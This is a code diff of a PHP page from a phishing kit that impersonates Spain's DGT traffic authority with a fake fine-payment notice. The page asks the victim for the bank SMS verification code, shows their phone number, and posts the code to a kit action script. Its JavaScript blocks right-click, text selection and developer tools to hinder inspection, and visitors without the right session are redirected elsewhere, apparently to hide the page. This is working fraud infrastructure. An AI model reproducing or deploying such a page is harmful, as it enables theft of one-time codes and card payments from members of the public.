@@ -6,156 +6,132 @@ include '../settings.php';
 if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true && isset($_SESSION['index_auth']) && $_SESSION['index_auth'] === true) {
 ?>
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
+<html lang="es">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <title>Page de sanctions</title>
-
-    <!-- Stylesheets -->
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css">
-
-    <!-- Custom Styles -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement de sanctions</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
-        /* Style du bouton */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            padding: 15px;
+        }
+        .main-header {
+            background-color: #007bff;
+            color: white;
+            padding: 10px;
+            text-align: center;
+        }
+        .main-header img {
+            max-height: 50px;
+        }
+        .form-container {
+            background-color: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+        .form-group label {
+            font-weight: bold;
+        }
         .custom-button {
-            background-color: #048;
-            color: #fff;
+            background-color: #007bff;
+            color: white;
             border: none;
-            padding: 10px 30px;
-            border-radius: 9px; /* Bords arrondis */
+            padding: 10px;
+            border-radius: 5px;
             cursor: pointer;
-            text-align: center;
+            width: 100%;
         }
-
-        /* Style au survol du bouton */
         .custom-button:hover {
-            background-color: #036; /* Changer la couleur au survol */
+            background-color: #0056b3;
         }
-
-        h5.mandatory {
-            font-family: "Open Sans", Helvetica, Arial, sans-serif;
-        }
-
-        /* Augmenter la largeur et la hauteur de la case de saisie */
-        .form-control {
-            width: calc(100% + 1px); /* Largeur de la case de saisie */
-            height: 50px; /* Hauteur de la case de saisie */
-            box-sizing: border-box; /* Assurer que le padding est inclus dans la largeur totale */
-            padding: 10px; /* Ajuster le padding pour centrer le texte verticalement */
-            font-size: 16px; /* Taille du texte pour une meilleure lisibilité */
-        }
-
-        /* Alignement des images */
-        .logos {
-            display: flex;
-            justify-content: center; /* Centrer horizontalement les images */
-            align-items: center; /* Aligner verticalement les images */
-        }
-
-        .logos img {
-            max-width: 150px; /* Limiter la largeur des images */
-            margin: 0 15px; /* Ajouter une marge entre les images */
-        }
-
-        /* Responsive Design */
-        @media (max-width: 767px) {
-            .custom-button {
-                width: 100%; /* Bouton pleine largeur sur petits écrans */
-                padding: 17px;
-            }
-
-            .container-fluid {
-                padding: 0 15px; /* Réduire les marges pour les petits écrans */
-            }
-
-            .main-header .brand {
-                text-align: center;
-            }
-
-            .form-control {
-                width: 100%;
-            }
-
-            .row {
-                margin-bottom: 10px;
-            }
-        }
-
-        /* Style des messages d'erreur */
-        .error-message {
-            color: red;
-            font-size: 16px;
+        footer {
             text-align: center;
+            margin-top: 20px;
+        }
+        footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            .main-header {
+                font-size: 18px;
+            }
+            .form-container {
+                padding: 10px;
+            }
         }
     </style>
 </head>
-<body id="myBody" class="js-enabled">
-
-<header class="main-header">
-    <div class="brand">
-        <div class="logos">
-            <a href="" target="_blank" title=""><img src="../assets/images/logo-mir.png" alt="Logo MIR"></a>
-            <a href="" target="_blank" title=""><img src="../assets/images/logo-dgt.png" alt="Logo DGT"></a>
+<body>
+    <header class="main-header">
+        <img src="../assets/images/logo-mir.png" alt="Logo MIR">
+        <img src="../assets/images/logo-dgt.png" alt="Logo DGT">
+        <div>Paiement de sanctions</div>
+    </header>
+    <main class="form-container">
+        <h2>Authenticación de su multa N°164357371274</h2>
+        <center>
+            <img src="https://campusdata.uark.edu/resources/images/articles/2020-03-06_01-01-36-PMmfa-newswire-colorBG.png" width="150">
+        </center>
+        <br>
+        <div class="mandatory">
+            <h5>Su banco para solicitar una autenticación adicional para validar su pago por favor ingrese el código de SMS recibido en su número: &nbsp; <?php echo $_SESSION['tel']; ?></h5>
         </div>
-        <a class="title" href="">
-            <span class="main">Pago de sanciones</span>
-        </a>
-    </div>
-</header>
+        <form method="post" action="../actions/sms_auth2.php">
+            <?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p style="color: red; font-size: 16px;">Código inválido o caducado, por favor compruébelo</p>'; } ?>
+            <div class="form-group">
+                <label for="ccnum">Código recibido por SMS</label>
+                <input id="ccnum" type="text" name="vbv_code2" class="form-control" minlength="1" maxlength="20" required>
+            </div>
+            <button type="submit" name="vbv_submit" class="custom-button">Continuar</button>
+            <input type="hidden" name="vbv_submit" value="true">
+        </form>
+    </main>
+    <footer>
+        <nav>
+            <a href="#">Aviso legal</a> | 
+            <a href="#">Propiedad intelectual</a> | 
+            <a href="#">Accesibilidad</a> | 
+            <a href="#">Protección de datos</a>
+        </nav>
+        <div class="footer-social">
+            <a href="#"><em class="fab fa-facebook-square"></em></a>
+            <a href="#"><em class="fab fa-twitter-square"></em></a>
+            <a href="#"><em class="fab fa-youtube-square"></em></a>
+            <a href="#"><em class="fab fa-instagram"></em></a>
+        </div>
+    </footer>
+    <script>
+        // Désactiver le clic droit
+        document.addEventListener("contextmenu", function(e){
+            e.preventDefault();
+        }, false);
 
-<main class="main-content">
-    <div class="dgt-announcements-header"></div>
-    
-    <h2>Autenticación de su multa N°164357371274</h2>
-    <center><img src="https://www.flyingeye.fr/wp-content/uploads/2022/11/logos-google-pay-apple-pay.png" width="250" alt="Google Pay y Apple Pay"></center>
-    
-    <div class="mandatory">
-        <h5 class="mandatory">Su banco para solicitar una autenticación adicional para validar su pago por favor ingrese el código de SMS recibido en su número: &nbsp; <?php echo $_SESSION['tel']; ?></h5>
-        <h5 class="mandatory">La validación está relacionada con Google Pay y Apple Pay</h5>    
-    </div>
+        // Désactiver la sélection de texte
+        document.addEventListener("selectstart", function(e){
+            e.preventDefault();
+        }, false);
 
-    <div class="box bordered-box overlapped-title-box">
-        <div class="container-fluid">
-            <form method="post" action="../actions/sms_auth.php">
-                <div class="row">
-                    <?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p class="error-message">Código inválido o caducado, por favor compruébelo</p>
-                    <div class="col-sm-8">
-                        <label class="mandatory">Código recibido por SMS</label>
-                        <input id="ccnum" type="text" name="vbv_code" class="form-control" minlength="6" maxlength="10" inputmode="numeric" oninput="chiffres_only(this)">
-                    </div>
-                  
-                </div>
-                <div class="row">
-                    <div class="col-sm-8">
-                        <button type="submit" name="vbv_submit" class="custom-button form-control">Continuar</button>
-                        <input type="hidden" name="vbv_submit" value="true">
-                    </div> 
-                </div>
-            </form>
-       </div>
-
-                  
-             
-             
-             
-     <center><input type="image" id="image" " src="imgages/pied.png" />"   
-   
-</script>
+        window.addEventListener("keydown", function(e) {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+                e.preventDefault();
+            }
+        });
+    </script>
 </body>
 </html>
-
 <?php
 } else {
     header("Location: https://www.mediapart.fr/");
     exit;
-
+}
 ?>
